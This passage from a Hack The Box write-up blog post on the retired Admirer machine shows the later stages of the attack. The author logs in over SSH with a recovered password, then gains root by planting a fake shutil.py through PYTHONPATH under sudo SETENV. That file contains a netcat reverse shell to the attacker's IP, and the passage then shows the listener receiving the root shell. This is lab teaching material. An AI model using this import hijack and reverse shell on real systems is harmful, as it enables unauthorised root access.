</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Admirer/waldoPass.png" alt="passwordUser" /></p><p>And we get something now: THE PASSWORD for <code class="language-plaintext highlighter-rouge">waldo</code> : <code class="language-plaintext highlighter-rouge">&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</code></p><h2 id="get-user-flag">Get User Flag</h2><p>If you remember from our first part, there was ssh running so let’s try and connect with the <code class="language-plaintext highlighter-rouge">user</code>:<code class="language-plaintext highlighter-rouge">password</code> we just got:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>ssh waldo@10.10.10.187
waldo@10.10.10.187<span class="s1">'s password:
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt
27e.......................44

</span></pre></table></code></div></div><p>GET A USER FLAG</p><h1 id="priviledge-escalation">Priviledge Escalation</h1><p>Let’s do a quick check of what we can do as admin if anything:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>waldo:

Sorry, try again.
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>waldo:
Sorry, try again.
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>waldo:
Matching Defaults entries <span class="k">for </span>waldo on admirer:
    env_reset, <span class="nv">env_file</span><span class="o">=</span>/etc/sudoenv, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, <span class="nv">listpw</span><span class="o">=</span>always

User waldo may run the following commands on admirer:
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/admin_tasks.sh
</pre></table></code></div></div><p>So we can execute <code class="language-plaintext highlighter-rouge">admin_tasks.sh</code> let’s check what there is there:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
</pre><td class="rouge-code"><pre>waldo@admirer:/opt/scripts<span class="nv">$ </span><span class="nb">cat </span>admin_tasks.sh
<span class="c">#!/bin/bash</span>

view_uptime<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/uptime <span class="nt">-p</span>
<span class="o">}</span>

view_users<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/w
<span class="o">}</span>

view_crontab<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/crontab <span class="nt">-l</span>
<span class="o">}</span>

backup_passwd<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/passwd to /var/backups/passwd.bak..."</span>
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        <span class="nb">echo</span> <span class="s2">"Done."</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_shadow<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/shadow to /var/backups/shadow.bak..."</span>
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        <span class="nb">echo</span> <span class="s2">"Done."</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_web<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
        /opt/scripts/backup.py &amp;
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_db<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running mysqldump in the background, it may take a while..."</span>
        <span class="c">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span>
        /usr/bin/mysqldump <span class="nt">-u</span> root admirerdb <span class="o">&gt;</span> /var/backups/dump.sql &amp;
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>



<span class="c"># Non-interactive way, to be used by the web interface</span>
<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 1 <span class="o">]</span>
<span class="k">then
    </span><span class="nv">option</span><span class="o">=</span><span class="nv">$1</span>
    <span class="k">case</span> <span class="nv">$option</span> <span class="k">in
        </span>1<span class="p">)</span> view_uptime <span class="p">;;</span>
        2<span class="p">)</span> view_users <span class="p">;;</span>
        3<span class="p">)</span> view_crontab <span class="p">;;</span>
        4<span class="p">)</span> backup_passwd <span class="p">;;</span>
        5<span class="p">)</span> backup_shadow <span class="p">;;</span>
        6<span class="p">)</span> backup_web <span class="p">;;</span>
        7<span class="p">)</span> backup_db <span class="p">;;</span>

        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
    <span class="k">esac

    </span><span class="nb">exit </span>0
<span class="k">fi</span>


<span class="c"># Interactive way, to be called from the command line</span>
<span class="nv">options</span><span class="o">=(</span><span class="s2">"View system uptime"</span>
         <span class="s2">"View logged in users"</span>
         <span class="s2">"View crontab"</span>
         <span class="s2">"Backup passwd file"</span>
         <span class="s2">"Backup shadow file"</span>
         <span class="s2">"Backup web data"</span>
         <span class="s2">"Backup DB"</span>
         <span class="s2">"Quit"</span><span class="o">)</span>

<span class="nb">echo
echo</span> <span class="s2">"[[[ System Administration Menu ]]]"</span>
<span class="nv">PS3</span><span class="o">=</span><span class="s2">"Choose an option: "</span>
<span class="nv">COLUMNS</span><span class="o">=</span>11
<span class="k">select </span>opt <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">options</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
    case</span> <span class="nv">$REPLY</span> <span class="k">in
        </span>1<span class="p">)</span> view_uptime <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        2<span class="p">)</span> view_users <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        3<span class="p">)</span> view_crontab <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        4<span class="p">)</span> backup_passwd <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        5<span class="p">)</span> backup_shadow <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        6<span class="p">)</span> backup_web <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        7<span class="p">)</span> backup_db <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        8<span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Bye!"</span> <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>

        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
    <span class="k">esac
done

</span><span class="nb">exit </span>0
</pre></table></code></div></div><p>Here there is a python script <code class="language-plaintext highlighter-rouge">backup.py</code> conviniently in the same folder:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">waldo</span><span class="nd">@admirer</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="err">$</span> <span class="n">cat</span> <span class="n">backup</span><span class="p">.</span><span class="n">py</span>
<span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="n">shutil</span> <span class="kn">import</span> <span class="n">make_archive</span>

<span class="n">src</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/var/www/html/</span><span class="sh">'</span>

<span class="c1"># old ftp directory, not used anymore
#dst = '/srv/ftp/html'
</span>
<span class="n">dst</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/var/backups/html</span><span class="sh">'</span>

<span class="nf">make_archive</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="sh">'</span><span class="s">gztar</span><span class="sh">'</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
</pre></table></code></div></div><p>Finally something we can user. Let’s create our own <code class="language-plaintext highlighter-rouge">shutil</code> and thus changing the python import. Now we can make it execute anything but just to be fun let’s get a root shell. I went to <code class="language-plaintext highlighter-rouge">/tmp</code> and created a folder called <code class="language-plaintext highlighter-rouge">exploit</code> and nanoed a <code class="language-plaintext highlighter-rouge">shutil.py</code> file with the following in it:</p><pre><code class="language-Python">import os

def make_archive(a, b, c):
    os.system('nc [YOUR IP] 4444 -e "/bin/bash"')
</code></pre><p>Since we know that the original function takes 3 arguments we also need these even if we aren’t using them at all.</p><p>Let’s execute the <code class="language-plaintext highlighter-rouge">admin_tasks.sh</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>waldo@admirer:/tmp/exploit<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/exploit /opt/scripts/admin_tasks.sh

<span class="o">[[[</span> System Administration Menu <span class="o">]]]</span>
1<span class="o">)</span> View system <span class="nb">uptime
</span>2<span class="o">)</span> View logged <span class="k">in </span><span class="nb">users
</span>3<span class="o">)</span> View crontab
4<span class="o">)</span> Backup passwd file
5<span class="o">)</span> Backup shadow file
6<span class="o">)</span> Backup web data
7<span class="o">)</span> Backup DB
8<span class="o">)</span> Quit
Choose an option: 6
Running backup script <span class="k">in </span>the background, it might take a <span class="k">while</span>...

</pre></table></code></div></div><p>Don’t forget to run netcat on another terminal:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>nc <span class="nt">-lvnp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.34] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.187] 42688
python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
root@admirer:/tmp/exploit# <span class="nb">cd
cd
</span>root@admirer:~# <span class="nb">ls
ls
</span>root.txt
root@admirer:~#
</pre></table></code></div></div><p>GET A ROOT FLAG</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/Writeups/categories/hack-the-box/'>Hack The Box</a>, <a href='/Writeups/categories/retired/'>Retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/Writeups/tags/sqli/" class="post-tag no-text-decoration" >SQLi</a> <a href="/Writeups/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/Writeups/tags/mysql/" class="post-tag no-text-decoration" >MySQL</a> <a href="/Writeups/tags/easy/" class="post-tag no-text-decoration" >easy</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Admirer - Writeups&url=http://susanou.github.io/Writeups/posts/Admirer/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Admirer - Writeups&u=http://susanou.github.io/Writeups/posts/Admirer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Admirer - Writeups&url=http://susanou.github.io/Writeups/posts/Admirer/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/Writeups/posts/cycling/">Cycling</a><li><a href="/Writeups/posts/mlsteal/">MLSteal</a><li><a href="/Writeups/posts/pythia/">Pythia</a><li><a href="/Writeups/posts/ChunkNoris/">Chunk Norris</a><li><a href="/Writeups/posts/Admirer/">Admirer</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/Writeups/tags/crypto/">crypto</a> <a class="post-tag" href="/Writeups/tags/rsa/">RSA</a> <a class="post-tag" href="/Writeups/tags/easy/">easy</a> <a class="post-tag" href="/Writeups/tags/web/">web</a> <a class="post-tag" href="/Writeups/tags/aes/">AES</a> <a class="post-tag" href="/Writeups/tags/linux/">linux</a> <a class="post-tag" href="/Writeups/tags/misc/">misc</a> <a class="post-tag" href="/Writeups/tags/mitm/">MITM</a> <a class="post-tag" href="/Writeups/tags/sqli/">SQLi</a> <a class="post-tag" href="/Writeups/tags/crt/">CRT</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/Writeups/posts/Magic/"><div class="card-body"> <span class="timeago small" > Aug 1, 2020 <i class="unloaded">2020-08-01T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Magic</h3><div class="text-muted small"><p> Reconnaissance &amp; Enumeration Let’s start by looking at what ports are open: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 nmap -sS -sC -sV -p- 10.10.10.185 [sudo] Mot de passe de fukurou : ...</p></div></div></a></div><div class="card"> <a href="/Writeups/posts/Heist/"><div class="card-body"> <span class="timeago small" > Nov 12, 2020 <i class="unloaded">2020-11-12T23:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Heist</h3><div class="text-muted small"><p> Enumeration Let’s start with some basic enumeration of the machine and adding it to our /etc/host 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35...</p></div></div></a></div><div class="card"> <a href="/Writeups/posts/qudraticresidue/"><div class="card-body"> <span class="timeago small" > Jan 11, 2021 <i class="unloaded">2021-01-11T23:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Quadratic Residues</h3><div class="text-muted small"><p></p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Writeups/posts/freelancer/" class="btn btn-outline-primary" prompt="Older"><p>Freelancer</p></a> <a href="/Writeups/posts/Magic/" class="btn btn-outline-primary" prompt="Newer"><p>Magic</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/Writeups/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//writeups-fukurou.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'Admirer'; this.page.url = 'http://susanou.github.io/Writeups/posts/Admirer/'; this.page.identifier = '/posts/Admirer/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/Susanou">Cameron Hochberg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="Susanou" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/Writeups/tags/crypto/">crypto</a> <a class="post-tag" href="/Writeups/tags/rsa/">RSA</a> <a class="post-tag" href="/Writeups/tags/easy/">easy</a> <a class="post-tag" href="/Writeups/tags/web/">web</a> <a class="post-tag" href="/Writeups/tags/aes/">AES</a> <a class="post-tag" href="/Writeups/tags/linux/">linux</a> <a class="post-tag" href="/Writeups/tags/misc/">misc</a> <a class="post-tag" href="/Writeups/tags/mitm/">MITM</a> <a class="post-tag" href="/Writeups/tags/sqli/">SQLi</a> <a class="post-tag" href="/Writeups/tags/crt/">CRT</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/Writeups/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://susanou.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
